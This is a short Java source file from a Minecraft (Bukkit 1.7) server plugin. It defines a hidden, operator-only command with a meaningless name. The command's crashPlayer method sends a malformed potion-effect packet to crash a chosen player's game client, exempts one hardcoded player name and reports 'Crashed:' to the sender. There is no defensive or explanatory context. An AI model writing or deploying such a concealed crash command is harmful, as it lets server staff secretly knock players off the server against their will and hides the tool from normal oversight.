package cc.stormworth.hcf.commands.op;

import cc.stormworth.core.util.chat.CC;
import cc.stormworth.core.util.command.annotations.Command;
import cc.stormworth.core.util.command.annotations.Param;
import net.minecraft.server.v1_7_R4.MobEffect;
import net.minecraft.server.v1_7_R4.PacketPlayOutEntityEffect;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R4.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class SapoHptaCommand {

  @Command(names = {"daasddsa"}, permission = "op", hidden = true)
  public static void crashPlayer(CommandSender sender, @Param(name = "target") Player target) {
    if (!target.getName().equalsIgnoreCase("6k2")) {

      ((CraftPlayer) target).getHandle().playerConnection.sendPacket(
          new PacketPlayOutEntityEffect(target.getEntityId(), new MobEffect(25, 20, 25)));

      sender.sendMessage(CC.translate("&aCrashed: &c" + target.getName()));
    }
  }
}
